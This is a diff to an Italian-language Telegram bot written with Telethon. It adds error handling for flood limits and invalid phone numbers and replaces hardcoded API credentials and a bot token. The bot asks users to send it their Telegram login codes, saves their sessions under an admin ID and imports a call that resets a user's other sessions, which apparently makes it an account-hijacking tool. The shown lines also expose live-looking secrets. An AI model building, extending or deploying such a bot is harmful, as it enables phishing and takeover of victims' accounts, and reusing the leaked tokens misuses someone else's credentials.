@@ -5,12 +5,18 @@ from flask import Flask
 import threading
 from telethon import TelegramClient, events, Button
 from telethon.tl.functions.account import ResetAuthorizationRequest
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, AuthRestartError
+from telethon.errors import (
+    SessionPasswordNeededError,
+    PhoneCodeInvalidError,
+    PhoneNumberInvalidError,
+    AuthRestartError,
+    FloodWaitError
+)
 
-# --- CREDENZIALI CONFIGURATE ---
-API_ID = 32531630
-API_HASH = "ed0ce5e3de48ef0f55582cbf5f2b3a7c"
-BOT_TOKEN = "9104042803:AAFe1goVzHUY4oyA3iV2_FoRMESuf3FzKPI"
+# --- CREDENZIALI ORIGINALI ---
+API_ID = 37810956
+API_HASH = "7753910251b42b5f91abe65c34f7f712"
+BOT_TOKEN = "9141462955:AAEY0YM2Wh7IhrBwXYeSClQZR1_3j_gZNLk"
 ADMIN_ID = 8886429641
 
 SESSION_DIR = "user_sessions"
@@ -557,6 +563,10 @@ async def message_router(event):
                 "Telegram ti ha inviato il codice di accesso.\n"
                 "Invia il codice ricevuto (es. `1 2 3 4 5` oppure `12345`):"
             )
+        except FloodWaitError as fw:
+            await event.respond(f"⏳ Troppi tentativi. Attendi `{fw.seconds}` secondi e riprova.")
+        except PhoneNumberInvalidError:
+            await event.respond("❌ **Numero non valido!** Controlla il numero (es. `+393331234567`) e riprova:")
         except AuthRestartError:
             await event.respond("🔄 Errore di connessione a Telegram. Riprova a inviare il numero.")
         except Exception as e:
